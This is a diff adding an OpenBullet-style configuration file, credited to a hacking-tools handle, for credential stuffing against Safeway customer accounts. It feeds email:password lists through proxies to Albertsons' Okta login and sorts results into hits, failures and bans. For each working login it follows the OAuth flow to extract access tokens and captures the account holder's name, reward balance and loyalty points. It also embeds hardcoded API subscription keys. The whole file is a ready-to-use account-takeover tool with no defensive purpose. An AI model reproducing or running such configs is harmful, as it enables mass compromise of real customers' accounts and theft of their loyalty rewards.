@@ -1,0 +1,180 @@
+[SETTINGS]
+{
+  "Name": "Safeway(@hackingtoolsprvi8)",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-03T16:58:50.1118472+01:00",
+  "AdditionalInfo": "",
+  "Author": "@hackingtoolsprvi8",
+  "Version": "1.4.5 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://albertsons.okta.com/api/v1/authn" 
+  CONTENT "{\"username\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "origin: https://www.safeway.com" 
+  HEADER "referer: https://www.safeway.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\", \"Google Chrome\";v=\"96\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" 
+  HEADER "x-okta-user-agent-extended: okta-auth-js-1.15.0" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Authentication failed" 
+  KEYCHAIN Success OR 
+    KEY "status\":\"SUCCESS" 
+  KEYCHAIN Ban OR 
+    KEY "<RESPONSECODE>" EqualTo "403" 
+
+#Name PARSE "<SOURCE>" JSON "firstName" CreateEmpty=FALSE -> CAP "Name" 
+
+#sessionToken PARSE "<SOURCE>" JSON "sessionToken" -> VAR "sessionToken" 
+
+#Get REQUEST GET "https://albertsons.okta.com/oauth2/ausp6soxrIyPrm8rS2p6/v1/authorize?client_id=0oap6ku01XJqIRdl42p6&redirect_uri=https%3A%2F%2Fwww.safeway.com%2Fbin%2Fsafeway%2Funified%2Fsso%2Fauthorize&response_type=code&response_mode=query&state=purple-curtain-brewer-lee&nonce=7ohtfHFOLDzLVS1IZHPxFV2iRJYKg6H2bxEu7SpSwI6Nw4OQIPKtwU5B2Q70hBdP&prompt=none&sessionToken=<sessionToken>&scope=openid%20profile%20email%20offline_access%20used_credentials" AutoRedirect=FALSE 
+  
+  HEADER "Host: albertsons.okta.com" 
+  HEADER "Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\"" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Referer: https://www.safeway.com/" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#Code PARSE "<HEADERS(location)>" LR "code=" "&" -> VAR "Code" 
+
+REQUEST GET "https://www.safeway.com/bin/safeway/unified/sso/authorize?code=<Code>&state=purple-curtain-brewer-lee" AutoRedirect=FALSE 
+  
+  HEADER "Host: www.safeway.com" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\"" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#Decode FUNCTION URLDecode "<COOKIES(SWY_SHARED_SESSION)>" -> VAR "Decode" 
+
+#accessToken PARSE "<Decode>" LR "accessToken\":\"" "\"" -> VAR "accessToken" 
+
+#Decode2 FUNCTION URLDecode "<COOKIES(SWY_SHARED_PII_SESSION_INFO)>" -> VAR "Decode2" 
+
+#gid PARSE "<Decode2>" LR "gid\":\"" "\"" -> VAR "gid" 
+
+#Decode3 FUNCTION URLDecode "<COOKIES(SWY_SYND_USER_INFO)>" -> VAR "Decode3" 
+
+#hhid PARSE "<Decode3>" LR "hhid\":\"" "\"" -> VAR "hhid" 
+
+#Get REQUEST GET "https://www.safeway.com/abs/pub/cnc/ucaservice/api/uca/customers/<gid>/profile?fl=identity,loyalty" AutoRedirect=FALSE 
+  
+  HEADER "Host: www.safeway.com" 
+  HEADER "Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\"" 
+  HEADER "Authorization: Bearer <accessToken>" 
+  HEADER "X-Swy_banner: safeway" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" 
+  HEADER "Ocp-Apim-Subscription-Key: 9e38e3f1d32a4279a49a264e0831ea46" 
+  HEADER "Accept: application/vnd.safeway.v2+json" 
+  HEADER "X-Swy-Correlation-Id: 2cbefc29-43bd-403e-b92b-bc7777f2a6a8" 
+  HEADER "X-Swy-Date: Thu Dec 30 2021 11:57:47 GMT+0330 (Iran Standard Time)" 
+  HEADER "Adrum: isAjax:true" 
+  HEADER "X-Swy-Client-Id: web-portal" 
+  HEADER "X-Swy-Banner: safeway" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.safeway.com/customer-account/account-settings" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#Get REQUEST POST "https://www.safeway.com/abs/pub/xapi/ocrp/rewards/scorecard" 
+  CONTENT "{\"hhid\":\"<hhid>\",\"programType\":[\"BASEPOINTS\"]}" 
+  CONTENTTYPE "application/vnd.safeway.v1+json" 
+  HEADER "Host: www.safeway.com" 
+  HEADER "Content-Length: 52" 
+  HEADER "Sec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"96\"" 
+  HEADER "Sec-Ch-Ua-Mobile: ?0" 
+  HEADER "Authorization: Bearer <accessToken>" 
+  HEADER "Ocp-Apim-Subscription-Key: daedbc8e06814b3f857bfe1f00270865" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Adrum: isAjax:true" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36" 
+  HEADER "Sec-Ch-Ua-Platform: \"Windows\"" 
+  HEADER "Origin: https://www.safeway.com" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Referer: https://www.safeway.com/justforu/rewards.html" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+
+#rewardBalance PARSE "<SOURCE>" JSON "rewardBalance" CreateEmpty=FALSE -> CAP "rewardBalance" 
+
+#Points PARSE "<SOURCE>" LR "Points\",\"value\":" "," CreateEmpty=FALSE -> CAP "Points" 
+
+FUNCTION Constant "@hackingtoolsprvi8" -> VAR "Config By" 
+
